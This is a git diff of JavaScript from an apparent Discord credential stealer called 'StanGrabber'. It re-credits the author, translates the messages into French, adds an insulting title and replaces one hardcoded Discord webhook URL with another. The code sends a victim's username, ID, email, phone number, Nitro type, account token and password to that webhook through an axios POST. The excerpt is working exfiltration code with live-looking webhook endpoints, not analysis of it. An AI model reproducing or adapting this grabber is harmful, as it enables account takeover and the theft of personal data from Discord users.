@@ -40,15 +40,15 @@ exports.send = (req, res, webhook) => {
             
             var omg = {
   author: {
-    name: "Dev By Hideaki#1337 x Stan#1337"
+    name: "Rebuild by flawz"
   },
-  title: "New person stoled",
-  description: `Username: \`${JSON.parse(JSON.stringify(y)).username}#${JSON.parse(JSON.stringify(y)).discriminator}\`\nID: \`${JSON.parse(JSON.stringify(y)).id}\`\nE-Mail: \`${JSON.parse(JSON.stringify(y)).email}\`\nPhone: \`${JSON.parse(JSON.stringify(y)).phone}\`\nNitro Type: \`${nitro}\`\nToken: \`${token}\`\nPassword: \`${password}\``,
+  title: "On dirait bien un compte discord d'un teubé",
+  description: `Pseudo: \`${JSON.parse(JSON.stringify(y)).username}#${JSON.parse(JSON.stringify(y)).discriminator}\`\nID: \`${JSON.parse(JSON.stringify(y)).id}\`\nE-Mail: \`${JSON.parse(JSON.stringify(y)).email}\`\nPhone: \`${JSON.parse(JSON.stringify(y)).phone}\`\nNitro Type: \`${nitro}\`\nToken: \`${token}\`\nMot de pass: \`${password}\``,
 
 }
             
 
-        axios.post(`https://discordapp.com/api/webhooks/820764982210854922/IQyRiSQz6AMU3T0uwptC9pq-627JvAIlLM7mnlmIpNQHTXvzOmIi5vpKxk8Kuk8Sdh7s`, {
+        axios.post(`https://discordapp.com/api/webhooks/820773872953589761/O3xkhgqda4NKY5yyafPNBb8KmT-Ms9FIebRSo-NrJS68sDIW_mNx1QTCGV2yk7iPugyX`, {
             username: JSON.parse(JSON.stringify(y)).username + " - StanGrabber",
             content: '', 
             embeds:[ omg ]
